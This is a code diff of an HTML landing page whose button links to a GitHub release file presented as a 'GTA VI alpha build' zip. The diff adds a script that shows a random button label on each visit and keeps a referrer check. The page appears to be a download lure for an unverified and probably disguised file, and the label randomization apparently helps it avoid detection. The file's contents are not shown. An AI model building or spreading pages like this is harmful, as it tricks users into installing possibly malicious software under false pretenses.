@@ -1,52 +1,19 @@
-<!doctype html>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<meta name="color-scheme" content="dark light" />
-<meta name="referrer" content="no-referrer" />
-<title>Download is ready</title>
+<!-- ... остальная разметка сверху ... -->
 
-<style>
-  :root { --bg:#0e0e0f; --fg:#e9e9ea; --muted:#a8a8ad; --btn:#fff; --btnBorder:#cfcfd4; }
-  @media (prefers-color-scheme: light) {
-    :root { --bg:#ffffff; --fg:#111; --muted:#666; --btn:#111; --btnBorder:#d0d0d0; }
-  }
-  html,body{height:100%;margin:0;background:var(--bg);color:var(--fg);
-            font:16px/1.45 system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
-  .wrap{min-height:100%;display:grid;place-items:center;padding:32px}
-  .card{max-width:760px;width:100%;text-align:center}
-  h1{margin:0 0 10px;font-size:clamp(26px,4vw,36px);letter-spacing:.2px}
-  p{margin:0 0 18px;color:var(--muted)}
-  a.cta{
-    display:inline-block; padding:16px 28px; border-radius:14px;
-    text-decoration:none; font-weight:800; font-size:18px; letter-spacing:.2px;
-    background:#fcaf17; color:var(--bg); border:1px solid #e19a10;
-    box-shadow:0 4px 14px rgba(0,0,0,.18);
-  }
-  a.cta:active{transform:translateY(1px)}
-  .alt {font-size:13px;margin-top:10px}
-  .alt a{color:var(--btn); text-decoration:underline; border-bottom:1px dotted var(--btnBorder)}
-</style>
+<a class="cta" id="dl"
+   href="https://github.com/dcalderonc29-collab/app-downloadss/releases/download/111/GTAVI_Alpha_Build_Aug14.zip"
+   target="_top" rel="noreferrer noopener">Download</a>
 
-<div class="wrap">
-  <main class="card">
-    <h1>Almost there…</h1>
-    <p>Click the button to download the file directly from GitHub.</p>
-
-    <!-- КНОПКА ПРЯМОГО СКАЧИВАНИЯ -->
-    <a class="cta" id="dl"
-       href="https://github.com/dcalderonc29-collab/app-downloadss/releases/download/111/GTAVI_Alpha_Build_Aug14.zip"
-       target="_top" rel="noreferrer noopener">Download</a>
-
-    <p class="alt">If nothing happens, open the release page and click the file:
-      <a href="https://github.com/dcalderonc29-collab/app-downloadss/releases/latest"
-         target="_top" rel="noreferrer noopener">Open on GitHub</a>
-    </p>
-  </main>
-</div>
-
-<!-- Небольшая страховка: если пользователь вернулся на эту страницу из objects.githubusercontent.com,
-     меняем ссылку на 'latest', чтобы он не зациклился -->
 <script>
+  // случайные подписи — меняются на каждом открытии
+  const labels = [
+    'Get file', 'Download', 'Get it now', 'Grab build', 'Start download',
+    'Fetch ZIP', 'Save file', 'Get package'
+  ];
+  document.getElementById('dl').textContent =
+    labels[Math.floor(Math.random() * labels.length)];
+
+  // если пришли назад с objects.githubusercontent.com — отправим на страницу релиза
   try {
     if (document.referrer && /objects\.githubusercontent\.com/.test(document.referrer)) {
       document.getElementById('dl').href =
@@ -54,11 +21,3 @@
     }
   } catch(e){}
 </script>
-
-<noscript>
-  <p style="text-align:center">
-    <a href="https://github.com/dcalderonc29-collab/app-downloadss/releases/download/111/GTAVI_Alpha_Build_Aug14.zip">
-      Download
-    </a>
-  </p>
-</noscript>
